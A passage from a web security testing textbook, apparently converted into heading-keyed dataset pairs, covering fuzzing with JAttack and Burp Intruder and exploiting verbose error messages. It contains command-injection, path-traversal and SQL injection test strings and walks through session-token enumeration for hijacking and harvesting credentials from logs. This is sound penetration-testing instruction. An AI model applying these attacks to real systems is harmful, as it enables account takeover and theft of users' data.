hit is the presence or absence of a\nspecific expression within the application’s response.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 490\n490 Chapter 13 ■ Automating Bespoke Attacks\nThis is all we need to do to create a basic web application fuzzer. To deliver\nthe actual attack, we simply need to configure JAttack with the relevant\nrequest details, instructing it to attack every parameter, as follows:\nString method = “POST”;\nString url = “/app/acc/login.jsp”;\nParam[] params = new Param[]\n{\nnew Param(“ts”, “29813”, Param.Type.URL, true),\nnew Param(“_DARGS”,\n“/app/acc/login_assumed.jsp”, Param.Type.URL, true),\nnew Param(“webabacus_id”, “131st22418177-1”, Param.Type.COOKIE, true),\nnew Param(“DYN_USER_ID”, “100014981”, Param.Type.COOKIE, true),\nnew Param(“USER_CONFIRM”, “836de5f76c5ec83”, Param.Type.COOKIE, true),\nnew Param(“ParkoSearch2007”, “true”, Param.Type.COOKIE, true),\nnew Param(“JSESSIONID”, “DKBHCAOQQWHFFCKTR”, Param.Type.COOKIE, true),\nnew Param(“_dyncharset”, “UTF-8”, Param.Type.BODY, true),\nnew Param(“_template”, “app/inc/templ.jsp”, Param.Type.BODY, true),\nnew Param(“personalDetailsURL”,\n“..%2Facc%2Fregister_p1.jsp”, Param.Type.BODY, true),\nnew Param(“login”, “user@wahh-mail.com”, Param.Type.BODY, true),\nnew Param(“originalRedirectFromURL”, “+”, Param.Type.BODY, true),\nnew Param(“password”, “bestinfw”, Param.Type.URL,BODY),\n};\nPayloadSource payloads = new PSFuzzStrings();\nWith this configuration in place, we can launch our attack. Within a few sec-\nonds, JAttack has submitted each of the attack payloads within each parame-\nter of the request—over 50 requests in all, which would have taken several\nminutes at least to issue manually, and far longer to review and analyze the\nraw responses received.\nThe next task is to manually inspect the output from JAttack and attempt to\nidentify any anomalous results that may indicate the presence of a vulnerabil-\nity. Let’s take a look at an extract of the output:\n_template ‘ 500 498 error not found\n_template ;/bin/ls 500 498 error not found\n_template ../../../../../etc/passwd 200 3987\n_template xsstest 500 498 error not found\npersonalDetailsURL ‘ 200 39192\npersonalDetailsURL ;/bin/ls 200 39199\npersonalDetailsURL ../../../../../etc/passwd 200 39417\npersonalDetailsURL xsstest 200 39198 xsstest\nlogin ‘ 500 761 error illegal\nlogin ;/bin/ls 302 412 invalid\nlogin ../../../../../etc/passwd 302 412 invalid\nlogin xsstest 302 412 invalid"
  },
  {
    "input": "Putting It All Together: Burp Intruder",
    "output": "70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 491\nChapter 13 ■ Automating Bespoke Attacks 491\nStarting with the _template parameter, our first request supplied a single\nquotation mark, and the server responded with an HTTP 500 error code. We\nmight immediately suppose that the application is vulnerable to SQL injection.\nHowever, if we look at the other results for this parameter, we can see that an\nidentical response was received when we supplied other payloads that are not\nnormally associated with SQL injection. When we supplied a path traversal\nstring, however, we received a different response: it has a 200 error code, is\nconsiderably longer, and does not contain the strings error or not found.\nLooking back at the original request, we can see that the _templateparameter\ntakes what appears to be a file path, and so a tentative diagnosis of the\nobserved behavior would be that the application’s handling of the parameter\nis vulnerable to a path traversal bug. We should immediately reissue this test\ncase manually and review the server’s response in full (see Chapter 10).\nThe personalDetailsURL parameter looks less exciting. Each test case\nreturns a 200 status code with responses that are almost the same length. How-\never, when we supplied the string xsstest, this string was copied into the\nserver’s response. The name of the parameter suggests that this is being used\nto transmit a URL via the client, which will be embedded into the next page\nreturned by the application. This operation may be vulnerable to cross-site\nscripting, and we should probe the application’s handling of more crafted\ninput in order to confirm this (see Chapter 12).\nThe login parameter is used to submit the username to the login function,\nand so submitting attack strings as this parameter should at the very least gen-\nerate a failed login. And indeed, we can see that three of the test cases result in\nan HTTP redirect containing the string invalid, which probably appears\nwithin the redirection URL. The fourth test case is much more interesting. Sub-\nmitting a single quotation mark as the username resulted in an HTTP 500\nresponse containing the strings error and illegal. This could indeed be a\nSQL injection flaw, and we should manually investigate to confirm this (see\nChapter 9).\nPutting It All Together: Burp Intruder\nThe JAttack tool consists of less than 250 lines of simple code, and yet in a few\nseconds, it uncovered at least three potentially serious security vulnerabilities\nwhile fuzzing a single request to an application.\nNevertheless, despite its power, as soon as you start to use a tool like JAttack\nto deliver automated bespoke attacks, you will quickly identify additional\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 492\n492 Chapter 13 ■ Automating Bespoke Attacks\nfunctionality that would make it even more helpful. As it stands, you need to\nconfigure every targeted request within the tool’s source code and then recom-\npile it. It would be better to read this information from a configuration file and\ndynamically construct the attack at runtime. In fact, it would be much better to\nhave a nice user interface which lets you configure each of the attacks described\nin a few seconds.\nThere are many situations in which you will need more flexibility in the way\nthat payloads are generated, requiring many more advanced payload sources\nthan the ones we have created. You will also often need support for SSL, HTTP\nauthentication, and automatic encoding of unusual characters within payloads.\nThere are situations in which modifying a single parameter at a time will be too\nrestrictive—you will want to inject one payload source into one parameter,\nand a different source into another. It would be good to store all of the applica-\ntion’s responses for easy reference, so that you can immediately inspect an\ninteresting response to understand what is happening, and even tinker with the\ncorresponding request manually and reissue it. It would also be nice to inte-\ngrate the tool with other useful hack tools like a proxy and a spider, avoiding\nthe need to cut and paste information back and forth.\nBurp Intruder is a unique tool that implements all of this functionality. It is\ndesigned specifically to enable you to perform all kinds of bespoke automated\nattacks with a minimum of configuration, and to present the results in a rich\namount of detail, enabling you to quickly home in on hits and other anom-\nalous test cases. It is also fully integrated with the other Burp Suite tools—for\nexample, you can trap a request in the proxy, pass this to Intruder to be fuzzed,\nand within seconds identify the kind of vulnerabilities described in the previ-\nous example.\nWe will describe the basic functions and configuration of Burp Intruder and\nthen look at some examples of it being used to perform bespoke automated\nattacks.\nPositioning Payloads\nBurp Intruder uses a similar conceptual model to JAttack, based on position-\ning payloads at specific points within a request, and one or more payload\nsources. However, it is not restricted to inserting payload strings into the val-\nues of the actual request parameters—payloads can be positioned at a sub-\npart of a parameter’s value, or at a parameter’s name, or indeed anywhere at\nall within the headers or body of a request.\nHaving identified a particular request to use as the basis for the attack, each\npayload position is defined using a pair of markers, to indicate the start and\nend of the insertion point for the payload, as shown in Figure13-1.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 493\nChapter 13 ■ Automating Bespoke Attacks 493\nFigure13-1: Positioning payloads\nWhen a payload is inserted at a particular position, any text between the\nmarkers will be overwritten with the payload. When a payload is not being\ninserted, the text between the markers will be submitted instead. This is nec-\nessary in order to test one parameter at a time, leaving others unmodified, as\nwhen performing application fuzzing. Clicking on the Auto button will make\nIntruder set payload positions at the values of all URL, cookie, and body para-\nmeters, thereby automating a tedious task that was done manually in JAttack.\nThe sniper attack type is the one you will need most frequently, and func-\ntions in the same way as JAttack’s request engine, targeting one payload posi-\ntion at a time, submitting all payloads at that position, and then moving on to\nthe next position. There are other attack types that enable you to target multi-\nple positions simultaneously in different ways, using multiple payload sets.\nChoosing Payloads\nThe next step in preparing an attack is to choose the set of payloads to be\ninserted at the defined positions. Intruder contains numerous built-in func-\ntions for generating attack payloads, including the following:\n■■ Lists of preset and configurable items.\n■■ Custom iteration of payloads based on any syntactic scheme. For exam-\nple, if the application uses usernames of the form ABC45D, then the\ncustom iterator can be used to cycle through the range of all possible\nusernames.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 494\n494 Chapter 13 ■ Automating Bespoke Attacks\n■■ Character and case substitution. From a starting list of payloads,\nIntruder can modify individual characters and their case to generate\nvariations. This can be useful when brute forcing passwords: for exam-\nple, the string passwordcan be modified to become p4ssword, passw0rd,\nPassword, PASSWORD, and so on.\n■■ Numbers, which can be used to cycle through document IDs, session\ntokens, and so on. Numbers can be created in decimal or hexadecimal,\nas integers or fractions, sequentially, in stepped increments, or ran-\ndomly. Producing random numbers within a defined range can be use-\nful in searching for hits when you have an idea of how large some valid\nvalues are but have not identified any reliable pattern for extrapolating\nthese.\n■■ Dates, which can be used in the same way as numbers in some situa-\ntions. For example, if a login form requires entry of date of birth, this\nfunction can be used to brute force all of the valid dates within a speci-\nfied range.\n■■ Illegal Unicode-encodings, which can be used to bypass some input fil-\nters by submitting alternative encodings of malicious characters.\n■■ Character blocks, which can be used to probe for buffer overflow vul-\nnerabilities (see Chapter 15).\n■■ A brute-forcer function, which can be used to generate all the permuta-\ntions of a particular character set in a specific range of lengths. Using\nthis function is a last resort in most situations because of the huge num-\nber of requests that it generates. For example, brute forcing all possible\nsix-digit passwords containing only lowercase alphabetical characters\nproduces more than three million permutations—more than can prac-\ntically be tested with only remote access to the application.\nBurp Intruder will by default URL-encode any characters that might invali-\ndate your request if placed into the request in their literal form.\nConfiguring Response Analysis\nBefore launching any attack, you should identify the attributes of the server’s\nresponses that you are interested in analyzing. For example, when enumerat-\ning identifiers, you may need to search each response for a specific string.\nWhen fuzzing, you may wish to scan for a large number of common error mes-\nsages and the like.\nBy default, Burp Intruder records in its table of results the HTTP status code,\nthe response length, any cookies set by the server, and the time taken to receive\nthe response. As with JAttack, you can additionally configure Burp Intruder to\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 495\nChapter 13 ■ Automating Bespoke Attacks 495\nperform some custom analysis of the application’s responses to help identify\ninteresting cases that may indicate the presence of a vulnerability or merit fur-\nther investigation. You can specify strings or regex expressions that responses\nwill be searched for. You can set customized strings to control extraction of\ndata from the server’s responses. And you can make Intruder check whether\neach response contains the attack payload itself, to help identify cross-site\nscripting and other response injection vulnerabilities.\nHaving configured payload positions, payload sources, and any required\nanalysis of server responses, you are ready to launch your attack. Let’s take a\nquick look at how Intruder can be used to deliver some common bespoke\nautomated attacks.\nAttack 1: Enumerating Identifiers\nSuppose that you are targeting an application that supports self-registration\nfor anonymous users. You create an account and log in, and gain access to a\nminimum of functionality. At this stage, one area of obvious interest is the\napplication’s session tokens. Logging in several times in close succession gen-\nerates the following sequence:\n000000-fb2200-16cb12-172ba72551\n000000-bc7192-16cb12-172ba7279e\n000000-73091f-16cb12-172ba729e8\n000000-918cb1-16cb12-172ba72a2a\n000000-aa820f-16cb12-172ba72b58\n000000-bc8710-16cb12-172ba72e2b\nYou follow the steps described in Chapter 7 to analyze these tokens. It is evi-\ndent that approximately half of the token is not changing, but you also dis-\ncover that the second portion of the token is not actually processed by the\napplication either. Modifying this portion entirely does not invalidate your\ntokens. Furthermore, although it is not trivially sequential, the final portion\nclearly appears to be incrementing in some fashion. This looks like a very\npromising opportunity for a session hijacking attack.\nTo leverage automation to deliver this attack, you need to find a single\nrequest/response pair that can be used to detect valid tokens. Typically, any\nrequest for an authenticated page of the application will serve this purpose.\nYou decide to target the main home page presented to each user following\nlogin:\nGET /home.jsp HTTP/1.1\nHost: wahh-app.com\nCookie: SessionID=000000-fb2200-16cb12-172ba72551\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 496\n496 Chapter 13 ■ Automating Bespoke Attacks\nBecause of what you know about the structure and handling of session\ntokens, your attack only needs to modify the final portion of the token. In fact,\nbecause of the sequence identified, the most productive initial attack will mod-\nify only the last few digits of the token. Accordingly, you configure Intruder\nwith a single payload position, as shown in Figure13-2.\nFigure13-2: Setting a custom payload position\nYour payloads need to sequence through all possible values for the final\nthree digits. The token appears to use the same character set as hexadecimal\nnumbers: 0–9 and a–f. So you configure a payload source to generate all hexa-\ndecimal numbers in the range 0x000–0xfff, as shown in Figure13-3.\nFigure13-3: Configuring numeric payloads\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 497\nChapter 13 ■ Automating Bespoke Attacks 497\nIn attacks to enumerate valid session tokens, identifying hits is typically\nstraightforward, and in the present case you have determined that the appli-\ncation returns an HTTP 200 response when a valid token is supplied, and an\nHTTP 302 redirect back to the login page when an invalid token is supplied.\nHence, you don’t need to configure any custom response analysis for this\nattack.\nLaunching the attack causes Intruder to quickly iterate through the requests.\nThe attack results are displayed in the form of a table. You can click on each\ncolumn heading to sort the results according to the contents of that column.\nSorting by status code enables you to easily identify the valid tokens that you\nhave discovered, as shown in Figure13-4.\nFigure13-4: Sorting attack results to quickly identify hits\nThe attack is successful. You can take any of the payloads that caused HTTP\n200 responses, replace the last three digits of your session token with this, and\nthereby hijack the sessions of other application users. However, take a closer\nlook at the table of results. Most of the HTTP 200 responses have roughly the\nsame response length, because the home page presented to different users is\nmore or less the same. However, two of the responses are much longer, indi-\ncating that a different home page was returned.\nYou can double-click on a result item in Intruder to display the server’s\nresponse in full, either as raw HTTP or rendered as HTML. Doing this reveals\nthat the longer home pages contain a much larger set of menu options than\nyour home page does. It appears that these two hijacked sessions belong to\nmore-privileged users.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 498\n498 Chapter 13 ■ Automating Bespoke Attacks\nTIP The response length very frequently proves to be a strong indicator of\nanomalous responses that merit further investigation. As in the above case, a\ndifferent length of response can point towards interesting differences that you\nmay not have been anticipating when you devised the attack. Therefore, even if\nanother attribute provides a reliable indicator of hits, such as the HTTP status\ncode, you should always inspect the response length column to identify other\nresponses that are interesting.\nAttack 2: Harvesting Information\nYou use your intercepting proxy to set one of the more privileged session\ntokens in your browser and so begin using the application interactively as the\ncompromised user. Among the various additional functionality to which you\nnow have access is a logging function, which contains log entries for all kinds\nof actions performed by other users of the application. Logs of this kind often\nprovide a gold mine of useful information that can assist you in furthering\nyour attack. Reading through a few entries, you discover that the application\nis logging detailed debugging information whenever an error occurs. This\nincludes the username of the relevant user, the user’s session token, and the\nfull parameters of the request. Such information is useful to application devel-\nopers when investigating and resolving errors within the application, and it is\nequally useful to an attacker. You can quickly grab a list of valid usernames\nand session tokens, and you can also capture the data entered by many other\napplication users. If an error occurred when a user supplied some sensitive\ninformation, such as a password or credit card details, then you will be able to\nharvest all of this information by trawling through the logs.\nLog file entries are accessed using the following request, where the logid\nparameter is a sequential number:\nPOST /secure/logs.jsp HTTP/1.1\nHost: wahh-app.com\nCookie: SessionID=000000-fb2200-16cb12-172ba72044\nContent-Length: 83\naction=view&resource=eventLogs&DB=wahh.audit&returnURL=/secure/logs.jsp&logid=\n29810\nTo configure Intruder to iterate through log file entries, you will need to use\na numeric payload source to generate integers within the range of identifiers\nin use, and you will need to set a single payload position, targeting the logid\nparameter, as shown in Figure13-5.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 499\nChapter 13 ■ Automating Bespoke Attacks 499\nFigure13-5: Positioning the payload\nWhen a log file entry contains a listing of user-supplied parameters, the rel-\nevant part of the HTML source looks like this:\n<div style=”param”>action=search</div>\n<div style=”param”>source=homeware</div>\n<div style=”param”>sort=price</div>\n<div style=”param”>start=20</div>\n<div style=”param”>q=toaster</div>\nYou can configure Intruder to capture all of this information in a usable form\nwith the Extract Grep function. This works in a similar way to the extract func-\ntion of JAttack—you specify the expression which precedes the item you\nwant to extract. However, in the present case, there are a variable number of\nitems you want to extract, each preceded by the same expression. To handle\nthis scenario, you simply need to enter this expression multiple times, and\nIntruder will search through the response for each occurrence, capturing\nwhatever comes next, until no more occurrences are found, as shown in\nFigure13-6.\nLaunching this attack quickly iterates through all of the log file entries in the\nrange specified. Many of the entries contain debugging information and show\nthe details of the data submitted by the user. As before, you can sort the results\nby the first extracted data column, to quickly review this for interesting items,\nas shown in Figure13-7.\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 500\n500 Chapter 13 ■ Automating Bespoke Attacks\nFigure13-6: Configuring Extract Grep\nFigure13-7: Data harvested from log file entries\nEven the first few results from the attack appear to contain plenty of useful\ndata, including usernames, passwords, and payment information. Continuing\nto mine data from the logs could soon enable you to compromise an adminis-\ntrative account and own the entire application.\nAttack 3: Application Fuzzing\nIn addition to exploiting the log functionality to extract useful information,\nyou should also, of course, probe it for common vulnerabilities. Functionality\nthat can be reached only by privileged users is often subject to less stringent\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 501\nChapter 13 ■ Automating Bespoke Attacks 501\nsecurity testing, because it is assumed that only trusted users will access it. If\nyou can somehow gain access to the functionality, you may be able to exploit\nany defect in it to escalate privileges even further—potentially compromising\nthe entire database or web server.\nTo perform a quick fuzz test of the previous request, you need to set payload\npositions at all of the request parameters, not only the logid parameter. You\ncan do this simply by clicking the “auto” button on the positions tab. You then\nneed to configure a set of attack strings to use as payloads and some common\nerror messages to search responses for. Intruder contains built-in sets of strings\nfor both of these uses.\nAs with the fuzzing attack performed using JAttack, you then need to man-\nually review the table of results to identify any anomalies that merit further\ninvestigation, as shown in Figure 13-8. As before, you can click on column\nheadings to sort the responses in various ways, to help identify interesting\ncases.\nFigure13-8: Results from fuzzing a single request\nFrom an initial look at the results, it strongly appears that the application is\nvulnerable to SQL injection. In payload positions 2 and 3, when a single quo-\ntation mark is submitted, the application returns an HTTP 500 status code and\na message containing the string ODBC. This behavior definitely warrants some\nmanual investigation to confirm and exploit the bug.\nTIP You can right-click on any interesting-looking result and send the\nresponse to the Burp Repeater tool. This enables you to modify the request\nmanually and reissue it multiple times, to test the application’s handling of\ndifferent payloads, probe for filter bypasses, or deliver actual exploits."
  },
  {
    "input": "Questions",
    "output": "70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 502\n502 Chapter 13 ■ Automating Bespoke Attacks\nChapter Summary\nWhen you are attacking a web application, the majority of the necessary tasks\nneed to be tailored to that application’s behavior and the methods by which it\nenables you to interact with and manipulate it. Because of this, you will often\nfind yourself working manually, submitting individually crafted requests, and\nreviewing the application’s responses to these.\nThe techniques we described in this chapter are conceptually intuitive. They\ninvolve leveraging automation to make these bespoke tasks easier, faster, and\nmore effective. It is possible to automate virtually any manual procedure that\nyou wish to carry out—using the power and reliability of your own computer\nto attack the defects and weak points of your target.\nAlthough conceptually straightforward, using bespoke automation in an\neffective way requires experience, skill, and imagination. There are tools that\nwill help you, or you can write your own. But there is no substitute for the\nintelligent human input that distinguishes a truly accomplished web applica-\ntion hacker from a mere amateur. When you have mastered all of the tech-\nniques described in the other chapters of this book, you should return to this\ntopic, and practice the different ways in which bespoke automation can be\nused in the application of those techniques.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. Identify three identifiers of hits when using automation to enumerate\nidentifiers within an application.\n2. For each of the following categories, identify one fuzz string that can\noften be used to identify it:\n(a) SQL injection\n(b) OS command injection\n(c) Path traversal\n(d) Script file inclusion\n3. When you are fuzzing a request that contains a number of different\nparameters, why is it important to perform requests targeting\neach parameter in turn and leaving the others unmodified?\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 503\nChapter 13 ■ Automating Bespoke Attacks 503\n4. You are formulating an automated attack to brute force a login function\nto discover additional account credentials. You find that the application\nreturns an HTTP redirection to the same URL regardless of whether you\nsubmit valid or invalid credentials. In this situation, what is the most\nlikely means you can use to detect hits?\n5. When you are using an automated attack to harvest data from within\nthe application, you will often find that the information you are inter-\nested in is preceded by a static string that enables you to easily capture\nthe data following it. For example:\n<input type=”text” name=”LastName” value=”\nOn other occasions, you may find that this is not the case, and that the\ndata preceding the information you need is more variable. In this situa-\ntion, how can you devise an automated attack that still fulfills your\nneeds?\n70779c13.qxd:WileyRed 9/14/07 3:14 PM Page 504"
  },
  {
    "input": "Exploiting Error Messages",
    "output": "70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 505\nCHAPTER\n14\nExploiting Information\nDisclosure\nIn Chapter 4, we described various techniques you can use to map a target\napplication and gain an initial understanding of how it works. That methodol-\nogy involved interacting with the application in largely benign ways, to cata-\nlog its content and functionality, determine the technologies in use, and\nidentify the key attack surface.\nIn this chapter, we describe ways in which you can extract further informa-\ntion from an application during an actual attack. This mainly involves interact-\ning with the application in unexpected and malicious ways, and exploiting\nanomalies in the application’s behavior in order to extract information that is of\nvalue to you. If successful, such an attack may enable you to retrieve sensitive\ndata such as user credentials, gain a deeper understanding of an error condition\nin order to fine-tune your attack, discover more detail about the technologies in\nuse, and map the application’s internal structure and functionality.\nExploiting Error Messages\nMany web applications return informative error messages when unexpected\nevents occur. These may range from simple built-in messages that disclose\nonly the category of the error, to full-blown debugging information that gives\naway a lot of detail about the application’s state.\n505\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 506\n506 Chapter 14 ■ Exploiting Information Disclosure\nMost applications are subject to various kinds of usability testing prior to\ndeployment, and this testing will typically identify most error conditions that\nmay arise when the application is being used in the normal way. These condi-\ntions are therefore normally handled in a graceful manner that does not\ninvolve any technical messages being returned to the user. However, when an\napplication is under active attack, it is likely that a much wider range of error\nconditions will arise, which may result in more detailed information being\nreturned to the user. Even the most security-critical applications, such as those\nused by online banks, have been found to return highly verbose debugging\noutput when a sufficiently unusual error condition is generated.\nScript Error Messages\nWhen an error arises in an interpreted web scripting language, such as\nVBScript, the application typically returns a simple message disclosing the\nnature of the error, and possibly the line number of the file where the error\noccurred. For example:\nMicrosoft VBScript runtime error 800a0009\nSubscript out of range: [number -1]\n/register.asp, line 821\nThis kind of message does not typically contain any sensitive information\nabout the state of the application or the data being processed. However, it may\nassist you in various ways in narrowing down the focus of your attack. For\nexample, when you are inserting different attack strings into a specific para-\nmeter to probe for common vulnerabilities, you may encounter the following\nmessage:\nMicrosoft VBScript runtime error ‘800a000d’\nType mismatch: ‘[string: “‘“]‘\n/scripts/confirmOrder.asp, line 715\nThis message indicates that the value that you have modified is probably\nbeing assigned to a numeric variable, and you have supplied input which can-\nnot be so assigned because it contains non-numeric characters. In this situa-\ntion, it is highly likely that nothing is to be gained by submitting non-numeric\nattack strings as this parameter, and so for many categories of bugs, you will\nbe better off targeting other parameters.\nA different way in which this type of error message may assist you is in\ngaining a better understanding of the logic that is implemented within\nthe server-side application. Because the message discloses the line number\nwhere the error occurred, you may be able to confirm whether two different\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 507\nChapter 14 ■ Exploiting Information Disclosure 507\nm alformed requests are triggering the same error or different errors. You may\nalso be able to determine the sequence in which different parameters are\nprocessed, by submitting bad input within multiple parameters and identify-\ning the location at which an error occurs. By systematically manipulating dif-\nferent parameters, you may be able to map out the different code paths being\nexecuted on the server.\nTIP Even if an error message does not disclose any interesting information, it\nmay represent an exploitable vulnerability. For example, it is common to find\nXSS bugs in error messages which contain the anomalous user-supplied input\nthat generated the error (see Chapter 12).\nStack Traces\nMost web applications are written in languages that are more complex than\nsimple scripts but which still run in a managed execution environment—for\nexample, Java, C#, and Visual Basic .NET. When an unhandled error occurs in\nthese languages, it is common to see full stack traces being returned to the\nbrowser.\nA stack trace is a structured error message that begins with a description of\nthe actual error. This is followed by a series of lines describing the state of the\nexecution call stack when the error occurred. The top line of the call stack\nshows the function that generated the error, the next line shows the function\nthat invoked the previous function, and so on down the call stack until the\nhierarchy of function calls is exhausted.\nThe following is an example of a stack trace generated by an ASP.NET\napplication:\n[HttpException (0x80004005): Cannot use a leading .. to exit above the\ntop directory.]\nSystem.Web.Util.UrlPath.Reduce(String path) +701\nSystem.Web.Util.UrlPath.Combine(String basepath, String relative) +304\nSystem.Web.UI.Control.ResolveUrl(String relativeUrl) +143\nPBSApp.StatFunc.Web.MemberAwarePage.Redirect(String url) +130\nPBSApp.StatFunc.Web.MemberAwarePage.Process() +201\nPBSApp.StatFunc.Web.MemberAwarePage.OnLoad(EventArgs e)\nSystem.Web.UI.Control.LoadRecursive() +35\nSystem.Web.UI.Page.ProcessRequestMain() +750\nVersion Information: Microsoft .NET Framework Version:1.1.4322.2300;\nASP.NET Version:1.1.4322.2300\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 508\n508 Chapter 14 ■ Exploiting Information Disclosure\nThis kind of error message provides a large amount of useful information\nthat may assist you in fine-tuning your attack against the application:\n■■ It often describes the precise reason why an error occurred. This may\nenable you to adjust your input to circumvent the error condition and\nadvance your attack.\n■■ The call stack typically makes reference to a number of library and third-\nparty code components that are being used within the application. You\ncan review the documentation for these components to understand their\nintended behavior and assumptions. You can also create your own local\nimplementation and test this to understand the ways in which it handles\nunexpected input and potentially identify vulnerabilities.\n■■ The call stack includes the names of the proprietary code components\nbeing used to process the request. The naming scheme for these and the\ninterrelationships between them may allow you to infer details about\nthe internal structure and functionality of the application.\n■■ The stack trace often includes line numbers. As with the simple script\nerror messages described previously, these may enable you to probe and\nunderstand the internal logic of individual application components.\n■■ The error message often includes additional information about the\napplication and the environment in which it is running. In the preced-\ning example, you can determine the exact version of the ASP.NET plat-\nform being used. This enables you to investigate the platform for\nknown or new vulnerabilities, anomalous behavior, common configura-\ntion errors, and so on.\nInformative Debug Messages\nSome applications generate custom error messages that contain a large\namount of debug information. These are normally implemented to facilitate\ndebugging during development and testing, and often contain rich detail\nabout the runtime state of the application. For example:\n-------------------------------------------\n* * * S E S S I O N * * *\n-------------------------------------------\ni5agor2n2pw3gp551pszsb55\nSessionUser.Sessions App.FEStructure.Sessions\nSessionUser.Auth 1\nSessionUser.BranchID 103\nSessionUser.CompanyID 76\nSessionUser.BrokerRef RRadv0\nSessionUser.UserID 229\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 509\nChapter 14 ■ Exploiting Information Disclosure 509\nSessionUser.Training 0\nSessionUser.NetworkID 11\nSessionUser.BrandingPath FE\nLoginURL /Default/fedefault.aspx\nReturnURL ../default/fedefault.aspx\nSessionUser.Key f7e50aef8fadd30f31f3aea104cef26ed2ce2be50073c\nSessionClient.ID 306\nSessionClient.ReviewID 245\nUPriv.2100\nSessionUser.NetworkLevelUser 0\nUPriv.2200\nSessionUser.BranchLevelUser 0\nSessionDatabase fd219.prod.wahh-bank.com\nThe following items are commonly included in verbose debug messages:\n■■ Values of key session variables that can be manipulated via user input.\n■■ Hostnames and credentials for back-end components such as databases.\n■■ File and directory names on the server.\n■■ Information embedded within meaningful session tokens (see\nChapter 7).\n■■ Encryption keys used to protect data transmitted via the client (see\nChapter 5).\n■■ Debug information for exceptions arising in native code components,\nincluding the values of CPU registers, contents of the stack, and a list of\nthe loaded DLLs and their base addresses (see Chapter 15).\nWhen this kind of error reporting functionality is present in live production\ncode, it may signify a critical weakness to the security of the application. You\nshould review it closely to identify any items that can be used to further\nadvance your attack, and any ways in which you can supply crafted input to\nmanipulate the application’s state and control the information retrieved.\nServer and Database Messages\nInformative error messages are often returned not by the application itself but\nby some back-end component such as a database, mail server, or SOAP server.\nIf a completely unhandled error occurs, the application will typically respond\nwith an HTTP 500 status code, and the response body may contain further\ninformation about the error. In other cases, the application may handle the\nerror gracefully and return a customized message to the user, sometimes\nincluding error information generated by the back-end component.\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 510\n510 Chapter 14 ■ Exploiting Information Disclosure\nDatabase error messages often contain information that you can use to\nadvance an attack. For example, they often disclose the query that generated\nthe error, enabling you to fine-tune a SQL injection attack:\nFailed to retrieve row with statement - SELECT object_data FROM\ndeftr.tblobject WHERE object_id = ‘FDJE00012’ AND project_id = ‘FOO’ and\n1=2--‘\nSee Chapter 9 for a detailed methodology describing how to develop data-\nbase attacks and extract information based on error messages.\nHACK STEPS\n■ When you are probing the application for common vulnerabilities by sub-\nmitting crafted attack strings in different parameters, always monitor the\napplication’s responses to identify any error messages that may contain\nuseful information.\n■ Be aware that error information which is returned within the server’s\nresponse may not be rendered on-screen within the browser. An efficient\nway to identify many error conditions is to search each raw response for\nkeywords that are often contained in error messages. For example:\nerror\nexception\nillegal\ninvalid\nfail\nstack\naccess\ndirectory\nfile\nnot found\nvarchar\nODBC\nSQL\nSELECT\n■ When you send a series of requests modifying parameters within a base\nrequest, check whether the original response already contains any of the\nkeywords you are looking for, to avoid false positives.\n■ You can use the Grep function of Burp Intruder to quickly identify any\noccurrences of interesting keywords in any of the responses generated\nby a given attack (see Chapter 13). Where matches are found, review the\nrelevant responses manually to determine whether any useful error\ninformation has been returned.\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 511\nChapter 14 ■ Exploiting Information Disclosure 511\nTIP If you are viewing the server’s responses in-browser, be aware that Internet\nExplorer by default hides many error messages and replaces them with a generic\npage. You can disable this behavior in the Advanced tab in Internet Options.\nUsing Public Information\nBecause of the huge variety of web application technologies and components\nin common use, you should frequently expect to encounter unusual messages\nthat you have not seen before, and that may not immediately indicate the\nnature of the error that the application experienced. In this situation, you can\noften obtain further information about the meaning of the message from vari-\nous public sources.\nOften, an unusual error message is the result of a failure in a specific API.\nSearching for the text of the message may lead you to the documentation for\nthis API or to developer forums and other locations where the same problem\nis discussed.\nMany applications employ third-party components to perform specific\ncommon tasks, such as searches, shopping carts, and site feedback functions.\nAny error messages that are generated by these components are likely to have\narisen in other applications, and to have been discussed elsewhere.\nSome applications incorporate source code that is publicly available. By\nsearching for specific expressions which appear in unusual error messages,\nyou may actually discover the source code which implements the relevant\nfunction. You can then review this to understand exactly what processing is\nbeing performed on your input, and how you may be able to manipulate the\napplication to exploit a vulnerability.\nHACK STEPS\n■ Search for the text of any unusual error messages using standard search\nengines. You can use various advanced search features to narrow down\nyour results. For example:\n“unable to retrieve” filetype:php\n■ Review the search results, looking both for any discussion about the error\nmessage and for any other web sites in which the same message has\nappeared. Other applications may produce the same message in a more\nverbose context, enabling you to better understand what kind of condi-\ntions give rise to the error. Use the search engine cache to retrieve exam-\nples of error messages that no longer appear within the live application.\nContinued\n70779c14.qxd:WileyRed 9/14/07 3:14 PM Page 512\n512 Chapter 14 ■ Exploiting Information Disclosure\nHACK STEPS (continued)\n■ Use Google code search to locate any publicly available code that may be\nresponsible for a particular error message. Search for snippets of error\nmessages that may be hard-coded into the application’s source code. You\ncan also use various advanced search features to specify the code lan-\nguage and other details, if this is known. For example:\nunable\\ to\\ retrieve lang:php package:mail\n■ If you have obtained stack traces containing the names of library and\nthird-party code components, search for these names on both types of\nsearch engines.\nEngineering Informative Error Messages\nIn some situations, it may be possible to systematically engineer error condi-\ntions in such a way as to retrieve sensitive information within the error mes-\nsage itself.\nOne common situation in which this possibility arises is where you can cause\nthe application to attempt some invalid action on a specific item of data. If the\nresulting error message discloses the value of that data, and you can cause\ninteresting items of information to be processed in this way, then you may 